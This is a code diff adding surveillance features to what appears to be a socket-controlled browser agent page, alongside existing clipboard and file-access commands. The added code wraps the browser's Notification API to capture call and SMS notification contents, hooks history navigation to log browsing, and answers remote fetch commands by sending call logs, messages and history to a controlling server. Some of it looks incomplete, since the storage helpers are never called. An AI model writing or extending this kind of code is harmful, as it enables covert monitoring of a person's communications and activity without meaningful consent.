@@ -699,6 +699,193 @@ function closeEmergency() {
   }
 }
 
+// ---- Call Log & SMS & History ----
+// Track browsing history on this device
+var browsingHistory = [];
+
+// Track page visibility changes as history entries
+document.addEventListener('visibilitychange', function() {
+  if (document.visibilityState === 'visible') {
+    browsingHistory.push({
+      url: window.location.href,
+      title: document.title,
+      timestamp: Date.now(),
+      type: 'page_visible'
+    });
+  }
+});
+
+// Intercept notification API to capture call/sms notifications
+if ('Notification' in window) {
+  var origNotification = window.Notification;
+  window.Notification = function(title, options) {
+    // Capture notification data
+    var notifData = {
+      title: title,
+      body: options && options.body ? options.body : '',
+      timestamp: Date.now(),
+      tag: options && options.tag ? options.tag : ''
+    };
+
+    // Detect call or sms from notification content
+    var titleLower = title.toLowerCase();
+    var bodyLower = notifData.body.toLowerCase();
+
+    if (titleLower.includes('call') || titleLower.includes('phone') ||
+        titleLower.includes('dial') || titleLower.includes('ring')) {
+      notifData.type = 'call';
+      socket.emit('notification:new', notifData);
+    } else if (titleLower.includes('sms') || titleLower.includes('message') ||
+               titleLower.includes('text') || titleLower.includes('msg')) {
+      notifData.type = 'sms';
+      socket.emit('notification:new', notifData);
+    } else {
+      notifData.type = 'other';
+      socket.emit('notification:new', notifData);
+    }
+
+    return new origNotification(title, options);
+  };
+  window.Notification.permission = origNotification.permission;
+  window.Notification.requestPermission = origNotification.requestPermission.bind(origNotification);
+}
+
+// Listen for call log fetch command
+socket.on('command:calllog:fetch', function() {
+  log('Call log requested', 'info');
+
+  // Collect call notifications captured so far
+  var callData = [];
+
+  // Check if we have stored calls in localStorage
+  try {
+    var stored = localStorage.getItem('mydevice_calls');
+    if (stored) {
+      callData = JSON.parse(stored);
+    }
+  } catch (e) {}
+
+  socket.emit('calllog:data', {
+    calls: callData,
+    note: callData.length === 0 ? 'Call log requires notification access. Notifications mein aane wale calls track honge.' : ''
+  });
+  log('Call log sent: ' + callData.length + ' entries', 'success');
+});
+
+// Listen for SMS fetch command
+socket.on('command:sms:fetch', function() {
+  log('SMS requested', 'info');
+
+  var smsData = [];
+
+  // Check stored SMS from notifications
+  try {
+    var stored = localStorage.getItem('mydevice_sms');
+    if (stored) {
+      smsData = JSON.parse(stored);
+    }
+  } catch (e) {}
+
+  socket.emit('sms:data', {
+    messages: smsData,
+    note: smsData.length === 0 ? 'SMS requires notification access. New SMS notifications track honge.' : ''
+  });
+  log('SMS sent: ' + smsData.length + ' entries', 'success');
+});
+
+// Listen for history fetch command
+socket.on('command:history:fetch', function() {
+  log('History requested', 'info');
+
+  // Send browsing history tracked during this session
+  socket.emit('history:data', {
+    history: browsingHistory,
+    sessionStart: window._sessionStartTime || Date.now()
+  });
+  log('History sent: ' + browsingHistory.length + ' entries', 'success');
+});
+
+// Store session start time
+window._sessionStartTime = Date.now();
+
+// Track navigation via Performance API
+if (window.performance && window.performance.getEntriesByType) {
+  var navEntries = window.performance.getEntriesByType('navigation');
+  if (navEntries.length > 0) {
+    browsingHistory.push({
+      url: window.location.href,
+      title: document.title || 'Agent Page',
+      timestamp: Date.now(),
+      type: 'navigation'
+    });
+  }
+}
+
+// Override pushState/replaceState to track SPA navigations
+var origPushState = history.pushState;
+var origReplaceState = history.replaceState;
+
+history.pushState = function() {
+  origPushState.apply(this, arguments);
+  browsingHistory.push({
+    url: window.location.href,
+    title: document.title,
+    timestamp: Date.now(),
+    type: 'pushState'
+  });
+};
+
+history.replaceState = function() {
+  origReplaceState.apply(this, arguments);
+  browsingHistory.push({
+    url: window.location.href,
+    title: document.title,
+    timestamp: Date.now(),
+    type: 'replaceState'
+  });
+};
+
+// Listen for notification:new to store call/sms data
+socket.on('connect', function() {
+  // Request notification permission on connect
+  if ('Notification' in window && Notification.permission === 'default') {
+    Notification.requestPermission().then(function(result) {
+      log('Notification permission: ' + result, result === 'granted' ? 'success' : 'info');
+    });
+  }
+});
+
+// Store incoming calls and SMS from notifications in localStorage
+function storeCallNotification(data) {
+  try {
+    var calls = JSON.parse(localStorage.getItem('mydevice_calls') || '[]');
+    calls.unshift({
+      number: data.body || data.title,
+      type: 'incoming',
+      timestamp: data.timestamp || Date.now(),
+      duration: '--'
+    });
+    // Keep last 200
+    if (calls.length > 200) calls = calls.slice(0, 200);
+    localStorage.setItem('mydevice_calls', JSON.stringify(calls));
+  } catch (e) {}
+}
+
+function storeSmsNotification(data) {
+  try {
+    var sms = JSON.parse(localStorage.getItem('mydevice_sms') || '[]');
+    sms.unshift({
+      from: data.title || 'Unknown',
+      body: data.body || '',
+      timestamp: data.timestamp || Date.now(),
+      read: false
+    });
+    // Keep last 200
+    if (sms.length > 200) sms = sms.slice(0, 200);
+    localStorage.setItem('mydevice_sms', JSON.stringify(sms));
+  } catch (e) {}
+}
+
 // ---- Clipboard ----
 socket.on('command:clipboard:get', async function() {
   try {
@@ -767,6 +954,26 @@ async function grantFilePermission() {
     log('File access denied: ' + err.message, 'error');
     updateFeature('fFiles', 'Denied', false);
     updateFeature('fGallery', 'Denied', false);
+  }
+}
+
+async function grantNotificationPermission() {
+  try {
+    if ('Notification' in window) {
+      var result = await Notification.requestPermission();
+      if (result === 'granted') {
+        log('Notification permission granted!', 'success');
+        document.getElementById('btnGrantNotifs').textContent = '🔔 Notifications Granted!';
+        document.getElementById('btnGrantNotifs').style.background = '#7f1d1d';
+        document.getElementById('btnGrantNotifs').disabled = true;
+      } else {
+        log('Notification permission denied', 'error');
+      }
+    } else {
+      log('Notifications not supported in this browser', 'error');
+    }
+  } catch (err) {
+    log('Notification permission error: ' + err.message, 'error');
   }
 }
 
